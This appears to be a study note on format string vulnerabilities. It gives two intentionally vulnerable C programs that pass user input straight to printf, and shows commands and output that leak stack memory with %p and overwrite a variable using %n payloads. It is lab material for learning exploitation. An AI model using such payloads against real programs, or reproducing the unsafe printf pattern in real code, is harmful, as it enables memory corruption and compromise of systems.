# Format String Vulnerability
- https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/
- https://feneshi.co/ctf4b2024writeup/#pure_and_easy
- https://docs.pwntools.com/en/stable/fmtstr.html
# example1
```c
// gcc -m32 chall.c
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[])
{
    char buffer[64];
    strcpy(buffer, argv[1]);
    printf(buffer);
    printf("\n");
    return 0;
}
```

```bash
./a.out $(python3 -c 'print("AAAA,"+",".join(["%p" for _ in range(20)]))')
AAAA,0xffc5a15f,(nil),0x565981e4,0xf7ef7540,0xffffffff,0x56597034,0xffc592c4,0xf7f30608,0xb,0xffc5920c,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70

./a.out "AAAA,%11\$p"
AAAA,0x41414141
```
# example2
```c
// gcc -m32 -z execstack chall3.c
// sudo sh -c 'echo 0 >/proc/sys/kernel/randomize_va_space'
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[])
{
    char buffer[128];
    static int deadbeef = 0xdeadbeef;
    static int a = 6;
    strcpy(buffer, argv[1]);
    printf(buffer);
    printf("\n");
    printf("value of a deadbeef: %08x\n", deadbeef);
    printf("value of a: %d\n", a);
    printf("address of a: 0x%08x\n", (unsigned)&a);
    printf("value of a in hex: 0x%08x\n\n\n", a);
    return 0;
}

/*
./a.out $(printf "\x0c\x90\x55\x56AAAA\x0d\x90\x55\x56BBBB\x0e\x90\x55\x56CCCC\x0f\x90\x55\x56DDDD")%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x

UVBBBBUVCCCCUVDDDDffffd15ff7fbe4a0565561e780000041ffffcfc4f7ffd0002005655900c414141415655900d424242425655900e43434343
value of a deadbeef: deadbeef
value of a: 6
address of a: 0x5655900c
value of a in hex: 0x00000006


./a.out $(printf "\x0c\x90\x55\x56AAAA\x0d\x90\x55\x56BBBB\x0e\x90\x55\x56CCCC\x0f\x90\x55\x56DDDD")%x%x%x%x%x%x%x%x%x%88x%n%17x%n%17x%n%17x%n

UVBBBBUVCCCCUVDDDDffffd155f7fbe4a0565561e780000041ffffcfb4f7ffd00020                                                                                       0         41414141         42424242         43434343
value of a deadbeef: deadbeef
value of a: -573785174
address of a: 0x5655900c
value of a in hex: 0xddccbbaa
*/
```
